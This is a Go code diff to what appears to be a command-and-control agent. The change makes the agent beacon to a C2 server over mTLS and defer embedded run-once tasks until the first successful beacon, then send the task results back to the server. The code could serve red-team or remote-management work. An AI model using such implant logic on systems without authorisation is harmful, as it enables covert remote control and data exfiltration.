@@ -64,40 +64,24 @@ func main() {
 	// Setup HTTP clients
 	httpClient := client.Setup(cfg.ServerName, cfg.APIServerName, cert, caCertPool, detectedHostIP)
 
-	// Setup task executor
-	taskExecutor := tasks.NewExecutor(cfg.AgentID, cfg.C2URL, httpClient.APIClient)
+	// Setup task executor (pass both API and C2 HTTP clients)
+	taskExecutor := tasks.NewExecutor(cfg.AgentID, cfg.C2URL, httpClient.APIClient, httpClient.C2Client)
 
-	// Parse and execute embedded tasks
+	// Parse embedded tasks (do NOT execute them until after successful beacon)
 	embeddedTasksJSON := config.GetEmbeddedTasks()
 	embeddedTasksList, err := tasks.ParseEmbeddedTasks(embeddedTasksJSON)
 	if err != nil {
 		log.Printf("Failed to parse embedded tasks: %v", err)
 	} else if len(embeddedTasksList) > 0 {
-		log.Printf("Loaded %d embedded tasks", len(embeddedTasksList))
-		
-		var taskResults []tasks.TaskResult
-		// Execute run-once tasks immediately
-		for _, task := range embeddedTasksList {
-			if task.RunOnce {
-				result := taskExecutor.ExecuteEmbedded(task)
-				taskResults = append(taskResults, result)
-			}
-		}
-		
-		// Send initial task results
-		if len(taskResults) > 0 {
-			taskExecutor.SendEmbeddedResults(taskResults, config.C2Server)
-		}
+		log.Printf("Loaded %d embedded tasks (deferred until after first successful beacon)", len(embeddedTasksList))
 	}
 
-	// Setup beacon
-	var beaconClient *beacon.Beacon
+
+	// Setup beacon (mTLS required). Tenant API key is ignored by the agent.
+	beaconClient := beacon.New(cfg.AgentID, cfg.C2URL, cfg.BeaconInterval, httpClient.C2Client)
 	if cfg.TenantAPIKey != "" {
-		log.Printf("Using tenant-specific API key for beacon")
-		beaconClient = beacon.NewWithTenant(cfg.AgentID, cfg.C2URL, cfg.TenantAPIKey, cfg.BeaconInterval, httpClient.C2Client)
-	} else {
-		beaconClient = beacon.New(cfg.AgentID, cfg.C2URL, cfg.BeaconInterval, httpClient.C2Client)
-	}
+		log.Printf("Note: tenant API key is configured but the agent will not send it (disabled)")
+	} 
 	
 	// Print system info
 	sysInfo := system.GetBasicInfo()
@@ -142,6 +126,23 @@ func main() {
 				} else {
 					log.Printf("Warning: Task %s has no command or task type", taskInfo.ID)
 				}
+			}
+		},
+		// onFirstSuccess: run deferred embedded run-once tasks after first successful beacon
+		func() {
+			if len(embeddedTasksList) == 0 {
+				return
+			}
+			log.Printf("Running deferred embedded run-once tasks after successful beacon")
+			var taskResults []tasks.TaskResult
+			for _, task := range embeddedTasksList {
+				if task.RunOnce {
+					result := taskExecutor.ExecuteEmbedded(task)
+					taskResults = append(taskResults, result)
+				}
+			}
+			if len(taskResults) > 0 {
+				taskExecutor.SendEmbeddedResults(taskResults, config.C2Server)
 			}
 		},
 	)
